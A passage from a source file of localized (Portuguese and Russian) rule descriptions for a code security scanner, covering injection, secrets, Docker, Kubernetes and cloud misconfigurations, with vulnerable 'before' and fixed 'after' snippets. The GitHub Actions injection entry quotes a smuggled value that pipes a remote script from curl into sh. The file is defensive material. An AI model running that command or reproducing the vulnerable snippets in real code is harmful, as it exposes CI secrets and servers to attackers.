      '"permissions: write-all" concede ao GITHUB_TOKEN do workflow acesso de escrita a tudo — issues, pull requests, pacotes, deployments — mesmo que o workflow use apenas uma parte. Se um passo do workflow for comprometido (uma dependência maliciosa, um script injetado), essas permissões mais amplas aumentam o que quem o explorar pode fazer.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # apenas as permissões que o workflow realmente usa`,
    },
  },
  "insecure-cookie-flags": {
    title: "Um cookie de sessão ou autenticação é definido sem as flags Secure e HttpOnly",
    description:
      'Um cookie com um nome parecido a sessão/autenticação/token é definido sem "httpOnly" e "secure" entre as suas opções. Sem httpOnly, o JavaScript na página — incluindo código injetado via XSS — pode ler esse cookie. Sem secure, também pode ser enviado numa ligação HTTP não cifrada.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dependência vulnerável:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ainda não é conhecida nenhuma versão corrigida — considere um pacote alternativo ou siga as atualizações do projeto."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "Um segredo é escrito diretamente numa instrução ENV ou ARG do Dockerfile",
    description:
      "Uma variável com um nome tipo password/secret/token/key tem um valor literal numa instrução ENV ou ARG. Ao contrário de um .env (que normalmente não acaba na imagem), este valor fica incorporado na própria imagem Docker — qualquer pessoa que possa fazer pull ou inspecionar o histórico das layers consegue recuperá-lo, mesmo que a linha seja removida numa versão posterior do Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passado com: docker build --build-arg DB_PASSWORD=*** (ou, melhor ainda,\n# com um secret mount do BuildKit, que nunca acaba no histórico das layers)`,
    },
  },
  "docker-missing-user": {
    title: "O Dockerfile não define um utilizador não-root",
    description:
      "Nenhuma instrução USER no Dockerfile: sem ela, o container corre como root. Se um atacante conseguir executar código dentro do container (ex.: explorando uma biblioteca vulnerável), ser root dentro do container torna mais fácil uma eventual fuga para o host — ou um impacto mais amplo no sistema circundante.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'A imagem base do Dockerfile usa a tag ":latest"',
    description:
      'Uma instrução FROM usa explicitamente a tag ":latest" em vez de uma versão precisa. "latest" muda ao longo do tempo: a mesma build, refeita noutro momento, pode obter uma versão diferente da imagem base — uma build não reproduzível, e uma atualização indesejada pode chegar sem que ninguém o tenha decidido.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "O Dockerfile descarrega um ficheiro remoto com ADD em vez de COPY",
    description:
      "Uma instrução ADD com um URL http/https descarrega um ficheiro da internet durante a build, sem verificação de integridade e sem que o conteúdo seja visível no repositório. Se esse URL for comprometido no futuro, a build incorpora conteúdo arbitrário sem que ninguém se aperceba ao ler o Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash esperada>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Um container do manifesto Kubernetes corre como privileged",
    description:
      '"privileged: true" no securityContext de um container desativa quase todo o isolamento normal entre container e host: o container pode aceder aos dispositivos do host, alterar a sua configuração de rede e, em muitos casos, obter efetivamente acesso root à máquina que o executa. Quase nunca é necessário para uma app normal.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # apenas as capabilities realmente necessárias`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Um segredo está escrito em texto simples numa variável env do manifesto Kubernetes",
    description:
      'Uma variável de ambiente com um nome tipo password/secret/token/key tem um valor literal ("value:") em vez de ser lida de um Secret ("valueFrom.secretKeyRef"). O próprio manifesto — muitas vezes submetido a um repositório — contém assim o segredo em texto simples, visível mesmo para quem só pode ler a configuração, não necessariamente executar comandos no cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Um container do manifesto Kubernetes está definido para correr como root",
    description:
      '"runAsUser: 0" ou "runAsNonRoot: false" no securityContext impõem explicitamente a execução como root dentro do container. Se um atacante conseguir executar código no container (ex.: explorando uma biblioteca vulnerável), ser root dentro do container torna mais fácil uma eventual fuga para o host ou um impacto mais amplo.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Um container do manifesto Kubernetes pode obter mais privilégios do que os iniciais",
    description:
      '"allowPrivilegeEscalation: true" no securityContext permite que um processo dentro do container obtenha mais privilégios do que o processo que o iniciou (ex.: através de um binário com o sticky bit setuid). Combinado com uma vulnerabilidade na aplicação, é mais um passo em direção à execução de código com privilégios maiores do que os previstos.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Um pod do manifesto Kubernetes partilha a rede, os processos ou a memória partilhada do host",
    description:
      '"hostNetwork", "hostPID" ou "hostIPC" definidos como true fazem o pod sair do seu isolamento normal: hostNetwork expõe o pod na rede do host (contornando as políticas de rede do cluster), hostPID dá-lhe visibilidade sobre todos os processos da máquina host, hostIPC dá-lhe acesso à memória partilhada do host. Quase nunca é necessário para uma app normal — típico apenas de ferramentas de sistema/monitorização de baixo nível.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "O manifesto Kubernetes não impõe explicitamente a execução como utilizador não-root",
    description:
      'Nenhum "runAsNonRoot" no manifesto (nem ao nível do pod nem do container individual): sem o definir, um container corre como o utilizador definido na sua imagem — muitas vezes root por omissão, se a própria imagem não o tiver alterado. Defini-lo explicitamente como true faz o arranque do pod falhar se a imagem ainda assim tentar correr como root, em vez de só se descobrir depois de um incidente.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
},
  ru: {
  "supabase-service-role-in-client": {
    title: "Секретный ключ Supabase попадает в файл, доступный браузеру",
    description:
      "Переменная с публичным префиксом (например, NEXT_PUBLIC_, VITE_) или файл на стороне клиента ссылается на service role key Supabase. Этот ключ обходит Row Level Security: если он попадает в бандл браузера, кто угодно может прочитать его и действовать как администратор базы данных.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (только сервер)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "В коде напрямую записаны пароли или секретные ключи",
    description:
      "Ключ API, токен или пароль записаны как буквальное значение вместо чтения из переменной окружения. Любой, кто прочитает исходный код (или репозиторий, если он публичный), получает этот секрет.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Среди анализируемых файлов есть файл с настоящими паролями проекта",
    description:
      "В анализ включён файл .env с реальными значениями (не .env.example). Если этот файл попадёт в репозиторий или в публичный деплой, все содержащиеся в нём учётные данные окажутся раскрыты.",
    fix: {
      before: `# .env (закоммичен по ошибке)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (закоммичен)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env остаётся вне репозитория (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Любой может читать или изменять данные всех пользователей",
    description:
      "Row Level Security отключена, либо политика разрешает доступ кому угодно (USING (true)) без проверки, кто делает запрос. Любой аутентифицированный пользователь — или даже анонимный — может читать или изменять данные всех остальных.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Значение, введённое пользователем, вставляется напрямую в запрос к базе данных",
    description:
      "SQL-запрос строится через конкатенацию или прямую интерполяцию строки вместо использования параметров. Если этот текст приходит (даже косвенно) от пользователя, он может изменить сам запрос — SQL-инъекция.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Похоже, пароли никак не защищены",
    description:
      "Поле пароля сохраняется в точности таким, каким пришло в запросе, и в файле не встречается ни одной функции хеширования (bcrypt, argon2, scrypt). Если база данных будет скомпрометирована, все пароли сразу же можно будет использовать.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Секрет, используемый для подписи входов в систему, записан в коде открытым текстом",
    description:
      "Секрет, передаваемый в jwt.sign / jwt.verify (или переменная JWT_SECRET), — это буквальное значение в коде вместо переменной окружения. Любой, кто его прочитает, сможет создавать валидные токены доступа для любого пользователя.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Сервер можно заставить выполнить внешние команды",
    description:
      "Функция, выполняющая системные команды (exec, execSync, spawn), получает строку, построенную через интерполяцию или конкатенацию. Если часть этой строки приходит из пользовательского ввода, тот, кто её контролирует, может заставить сервер выполнить произвольные команды.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Файл на сервере можно прочитать или записать, выбрав путь извне",
    description:
      'Функция, которая читает, записывает или отправляет файл, получает путь напрямую из значения запроса (query, body, params) без проверки, что он остаётся внутри разрешённой папки. Злоумышленник может вставить "../", чтобы выйти за пределы предполагаемой папки и прочитать или перезаписать произвольные файлы на сервере (например, конфигурационный файл с учётными данными).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Путь не разрешён")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Значение, введённое пользователем, выполняется как код внутри запроса MongoDB",
    description:
      "Оператор $where в MongoDB выполняет JavaScript на стороне сервера для каждого документа — если эта строка строится через конкатенацию значения, пришедшего от пользователя, тот, кто его контролирует, может заставить выполниться произвольный код в контексте базы данных, а не просто изменить фильтр, как при обычной SQL-инъекции.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Значение, введённое пользователем, интерпретируется как шаблон, а не как данные",
    description:
      "Функция, которая компилирует/рендерит шаблон, получает ВЕСЬ шаблон из значения запроса, вместо того чтобы использовать фиксированный шаблон и передавать только данные. Злоумышленник может писать напрямую в синтаксисе шаблонизатора (например, {{7*7}} для Jinja2) и выполнять код на сервере — Server-Side Template Injection, которая часто приводит к выполнению произвольных команд, а не просто к проблеме отображения, как XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-парсер можно заставить читать файлы или делать внешние запросы",
    description:
      "XML-парсер (DocumentBuilderFactory) создаётся без явного отключения внешних сущностей (DOCTYPE) в соседних строках. Если парсер получает XML из ненадёжного источника, злоумышленник может определить внешнюю сущность, чтобы прочитать файлы на сервере или заставить его обратиться по адресу на свой выбор — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Security group Terraform открывает чувствительный порт всему интернету",
    description:
      'Правило с "cidr_blocks", включающим 0.0.0.0/0 (любой IP-адрес), находится рядом с чувствительным портом — SSH (22), RDP (3389) или типичным портом базы данных (MySQL, Postgres, MongoDB, Redis, SQL Server). Кто угодно в интернете может попытаться подключиться к этому сервису, а не только те, кому следует.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # только ваша приватная сеть или bastion-хост\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Правило firewall Google Cloud открывает чувствительный порт всему интернету",
    description:
      'Ресурс "google_compute_firewall" с "source_ranges", включающим 0.0.0.0/0 (любой IP-адрес), разрешает трафик к чувствительному порту — SSH (22), RDP (3389) или типичному порту базы данных (MySQL, Postgres, MongoDB, Redis, SQL Server). Кто угодно в интернете может попытаться подключиться к этому сервису, а не только те, кому следует.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # только ваша приватная сеть или bastion-хост\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Сетевое правило Azure открывает чувствительный порт всему интернету",
    description:
      'Правило сетевой безопасности ("azurerm_network_security_rule", или блок "security_rule" внутри "azurerm_network_security_group") с "source_address_prefix" равным "*" или "0.0.0.0/0", направлением "Inbound" и доступом "Allow", находится рядом с чувствительным портом — SSH (22), RDP (3389) или типичным портом базы данных. Кто угодно в интернете может попытаться подключиться к этому сервису, а не только те, кому следует.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # только ваша приватная сеть или bastion-хост\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Секрет записан как значение по умолчанию переменной Terraform",
    description:
      'Переменная с именем вроде password/secret/token/key имеет буквальное значение в своём "default". В отличие от значения, передаваемого во время выполнения (tfvars, переменные окружения TF_VAR_*), значение по умолчанию попадает в исходный код — и если репозиторий общий или публичный, его увидит кто угодно, даже без доступа к состоянию Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # без значения по умолчанию: передавайте через файл .tfvars (вне git) или переменную окружения TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Значение, контролируемое внешним пользователем, напрямую попадает в shell-команду CI",
    description:
      'Команда "run:" в workflow GitHub Actions напрямую интерполирует значение вроде заголовка pull request, имени ветки или текста комментария — всё это может написать кто угодно, открывший pull request или комментарий, даже из внешнего форка. Значение вроде `"; curl malware.sh | sh #` выполнило бы произвольные команды в CI с доступом ко всем секретам, доступным в этом workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # передаётся как переменная окружения, никогда не интерполируется напрямую в команду`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow выполняет код внешнего pull request с доступом к секретам репозитория",
    description:
      'Workflow использует "pull_request_target" — который выполняется с правами и секретами базового репозитория даже для pull request, открытого из постороннего форка — и делает checkout кода самого pull request ("github.event.pull_request.head"), а не базовой ветки. Тот, кто открывает pull request, фактически получает выполнение своего кода с доступом к этим секретам.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Делает checkout базовой ветки, а не кода PR — либо используйте\n      # "pull_request" вместо "pull_request_target", если более широкие\n      # права/секреты не нужны.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Данные запроса десериализуются в формате, который может выполнять код",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) или библиотека node-serialize (Node) десериализуют значение, взятое напрямую из запроса. В отличие от JSON, эти форматы могут представлять и выполнять код прямо во время десериализации — тот, кто контролирует отправленное значение, может добиться выполнения произвольного кода на сервере.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON никогда не выполняет код при разборе, в отличие от pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Код явно принимает неподписанные JWT-токены (алгоритм "none")',
    description:
      '"none" присутствует среди алгоритмов, принимаемых для проверки JWT-токена. У токена с алгоритмом "none" нет подписи для проверки: кто угодно может создать такой токен с любым содержимым (например, с ролью администратора), и код примет его как валидный.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // никогда не включайте "none" в число принимаемых алгоритмов`,
    },
  },
  "unprotected-new-table": {
    title: "Похоже, новая таблица создана без защиты",
    description:
      "SQL-миграция создаёт таблицу, но не включает Row Level Security для этой же таблицы в том же файле. Пока это так, таблица изначально не имеет никаких ограничений на то, кто может её читать или писать в неё.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Сайт принимает запросы от любого другого сайта",
    description:
      "Заголовок CORS настроен на приём запросов с любого источника (*), либо middleware cors() используется без ограничений. Любой сторонний сайт может вызывать ваши API из браузера уже аутентифицированного пользователя.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Функция с правами администратора не проверяет, кто её использует",
    description:
      "Маршрут или функция, чьё название намекает на административные операции, не содержит в соседних строках никакой проверки аутентификации или роли. Любой, кто знает URL, сможет её выполнить.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Сайт можно заставить выполнить внешний код",
    description:
      "Исходящий HTTP-запрос (fetch, axios) напрямую использует значение, пришедшее из запроса пользователя, в качестве целевого URL. Злоумышленник может заставить ваш сервер обращаться к внутренним или произвольным адресам — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL не разрешён")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Пароли защищены методом, который теперь легко взломать",
    description:
      "В той же строке к значению, связанному с паролем, применяется md5() или sha1(). Эти алгоритмы вычисляются слишком быстро: злоумышленник с базой данных может перебирать миллиарды паролей в секунду.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Контейнер в манифесте Kubernetes настроен на запуск от root",
    description:
      '"runAsUser: 0" или "runAsNonRoot: false" в securityContext явно принуждают контейнер выполняться от root. Если злоумышленнику удастся выполнить код внутри контейнера (например, через уязвимую библиотеку), root внутри контейнера облегчает возможный побег на хост или более широкое воздействие.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Контейнер в манифесте Kubernetes может получить больше привилегий, чем изначально",
    description:
      '"allowPrivilegeEscalation: true" в securityContext позволяет процессу внутри контейнера получить больше привилегий, чем у процесса, который его запустил (например, через бинарник с битом setuid). В сочетании с уязвимостью в приложении это ещё один шаг к выполнению кода с привилегиями, бóльшими, чем предполагалось.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Под в манифесте Kubernetes делит сеть, процессы или общую память хоста",
    description:
      '"hostNetwork", "hostPID" или "hostIPC", установленные в true, выводят под из его обычной изоляции: hostNetwork выставляет под в сеть хоста (в обход сетевых политик кластера), hostPID даёт ему видимость всех процессов на хост-машине, hostIPC даёт доступ к общей памяти хоста. Почти никогда не нужно для обычного приложения — типично только для низкоуровневых системных/мониторинговых инструментов.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access отключён на бакете S3, определённом в Terraform",
    description:
      'Одна или несколько из четырёх защит в "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) установлены в false. Это не значит, что бакет уже публичный, но это убирает защитную сетку, которая не дала бы случайно сделать его публичным в будущем.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "IAM-политика, определённая в Terraform, предоставляет полный доступ",
    description:
      'Statement с действием "*" и ресурсом "*" предоставляет полный доступ ко всем сервисам и ресурсам AWS — та же проверка, что уже выполняется для живого состояния IAM, только здесь она читается прямо из кода ещё до применения. Это может быть намеренно сделано для аварийной роли, но это стоит подтвердить: для повседневного использования предоставляйте только действительно необходимые права.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Бакет Google Cloud Storage сделан доступным для чтения кому угодно",
    description:
      'Ресурс "google_storage_bucket_iam_member" или "google_storage_bucket_iam_binding" предоставляет роль "allUsers" или "allAuthenticatedUsers" — первое делает бакет доступным для чтения кому угодно в интернете, даже без аккаунта Google; второе — любому, у кого есть любой аккаунт Google, а не только тем, кому следует иметь доступ.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # только те, кому действительно нужен доступ, не allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Публичный доступ к блобам включён на аккаунте хранилища Azure",
    description:
      '"allow_blob_public_access" установлен в true на "azurerm_storage_account": любой, кто знает URL блоба/контейнера, сделанного публичным, может его прочитать без какой-либо аутентификации.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Роль IAM Google Cloud предоставляет полный доступ (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (или эквивалент на уровне организации/папки) назначает примитивную роль "roles/owner" или "roles/editor" — почти полный доступ ко всем сервисам проекта. Это может быть намеренно сделано для аварийного аккаунта, но это стоит подтвердить: для повседневного использования предоставляйте только более специфичные предопределённые роли, которые действительно нужны.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # только действительно нужная предопределённая роль, не roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Назначение роли Azure предоставляет полный доступ (Owner)",
    description:
      '"azurerm_role_assignment" назначает роль "Owner" — полный доступ, включая контроль над правами других пользователей, во всём назначенном scope (подписка, группа ресурсов...). Это может быть намеренно сделано для аварийного аккаунта, но это стоит подтвердить: для повседневного использования предоставляйте только более специфичную роль, которая действительно нужна (например, "Contributor" для одной группы ресурсов).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # только более специфичная роль, которая действительно нужна, не Owner на всю подписку\n}`,
    },
  },
  "weak-random-token": {
    title: "Токен безопасности сгенерирован генератором случайных чисел, не предназначенным для криптографии",
    description:
      "Значение с именем вроде token/session/reset/otp/csrf генерируется с помощью Math.random() (JS), random.random() (Python) или rand() (PHP) — генераторов, не предназначенных для безопасности, последовательности которых предсказуемы. Токен, сгенерированный таким образом, можно угадать или восстановить, что сводит на нет его предназначение (например, ссылку для сброса пароля, которую кто угодно сможет предугадать).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, не Math.random — непредсказуемо`,
    },
  },
  "ldap-injection": {
    title: "LDAP-фильтр строится путём прямой конкатенации значения из запроса",
    description:
      'Строка, которая строит LDAP-фильтр (например, "(uid=...)"), напрямую включает значение, взятое из запроса, без какого-либо экранирования специальных символов LDAP. Тот, кто контролирует это значение, может изменить логику фильтра — например, обойти проверку аутентификации или прочитать данные каталога, которые не должен видеть.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // специальные символы LDAP всегда нужно экранировать перед использованием в фильтре\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "Текст, написанный пользователями, может выполнить код в браузере",
    description:
      "Контент вставляется на страницу как необработанный HTML (dangerouslySetInnerHTML, v-html, .innerHTML) вместо обычного текста. Если этот контент включает пользовательский ввод, он может содержать скрипты, которые выполнятся в браузере того, кто читает страницу.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// или, если нужен HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Пространство для загруженных файлов видно кому угодно",
    description:
      "Bucket хранилища (Supabase Storage, S3) настроен как публичный. Если он содержит документы, фото или файлы, загруженные пользователями, любой, кто знает — или угадает — путь, может получить к ним доступ без аутентификации.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// отдавайте файлы через подписанные URL с ограниченным временем: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Одной ссылки достаточно, чтобы удалить или изменить данные",
    description:
      "Маршрут GET выполняет операцию, изменяющую данные (путь содержит delete/remove/update/edit). Запросы GET выполняются просто при переходе по ссылке или загрузке изображения с внешнего сайта — классическая зацепка для атаки CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Данные для входа, сохранённые в браузере, защищены плохо",
    description:
      "Токен доступа сохраняется в localStorage. В отличие от httpOnly cookie, любой скрипт, выполняющийся на странице (включая вредоносный, внедрённый через XSS), может его прочитать и украсть.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// установите токен как httpOnly cookie на сервере:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Сайт можно использовать для перенаправления на мошеннический сайт",
    description:
